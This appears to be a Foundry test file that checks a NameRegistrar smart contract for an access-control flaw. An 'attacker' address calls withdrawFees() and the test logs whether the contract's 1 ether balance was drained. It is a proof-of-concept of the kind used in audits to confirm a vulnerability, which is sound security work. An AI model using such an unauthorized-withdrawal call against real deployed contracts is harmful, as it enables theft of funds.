// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/name_registrar.sol";

contract NameRegistrarTest is Test {
    NameRegistrar registrar;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    uint256 depositAmount = 1 ether;

    function setUp() public {
        // Deploy NameRegistrar
        vm.prank(owner);
        registrar = new NameRegistrar();
        
        // Fund contract with test Ether
        vm.deal(address(registrar), depositAmount);
    }

    function test_UnauthorizedWithdrawal() public {
        console.log("--- BEFORE-Trigger UnauthorizedWithdrawal ---");
        uint256 contractBalanceBefore = address(registrar).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract Balance Before:", contractBalanceBefore);
        console.log("Attacker Balance Before:", attackerBalanceBefore);

        console.log("--- Trigger UnauthorizedWithdrawal ---");
        // Attack: Unauthorized withdrawal
        vm.prank(attacker);
        registrar.withdrawFees();

        console.log("--- AFTER-Trigger UnauthorizedWithdrawal ---");
        uint256 contractBalanceAfter = address(registrar).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract Balance After:", contractBalanceAfter);
        console.log("Attacker Balance After:", attackerBalanceAfter);

        // Compute state changes
        uint256 contractBalanceChange = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerBalanceChange = attackerBalanceAfter - attackerBalanceBefore;

        console.log("Contract Balance Change:", contractBalanceChange);
        console.log("Attacker Balance Change:", attackerBalanceChange);
        console.log("Expected Transfer:", depositAmount);

        // Final vulnerability verdict
        if (contractBalanceAfter == 0 && attackerBalanceChange == depositAmount) {
            console.log("Vulnerability Exists: Attacker successfully drained contract");
        } else {
            console.log("Vulnerability not Exist: Unauthorized withdrawal failed");
        }
    }
}